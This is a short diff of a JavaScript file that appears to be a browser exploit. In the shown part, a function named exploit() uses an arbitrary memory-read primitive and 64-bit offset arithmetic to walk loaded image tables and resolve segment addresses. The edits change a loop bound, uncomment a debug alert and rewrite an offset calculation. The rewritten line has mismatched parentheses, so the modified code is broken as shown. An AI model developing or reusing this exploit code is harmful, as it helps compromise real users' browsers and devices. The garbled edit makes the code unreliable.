@@ -61,7 +61,7 @@ function off2addr(segs, off)
     {
   
         if(!(off instanceof Int64)) off = new Int64(off);
-        for(var i = 0; i < 3; ++i)
+        for(var i = 0; i < segs.length; ++i)
         {
             var start = segs[i].fileoff;
             var end   = Add(start, segs[i].size);
@@ -712,9 +712,9 @@ function exploit(){
         for(var i = 0; i < nimgs; i++)
         {
         
-            var m = i * 0x20 + 0x18;
-           // alert(memory.u32(Add(imgs,m + 0x18)))
-            var straddr = off2addr(segs, memory.u32(imgs + m))
+            var m = i * 0x20;
+            alert(memory.u32(Add(imgs,m + 0x18)))
+            var straddr = off2addr(segs, memory.u32(Add(imgs + m),new Int64("0x18"))
             var fn = function(i)
 
             {
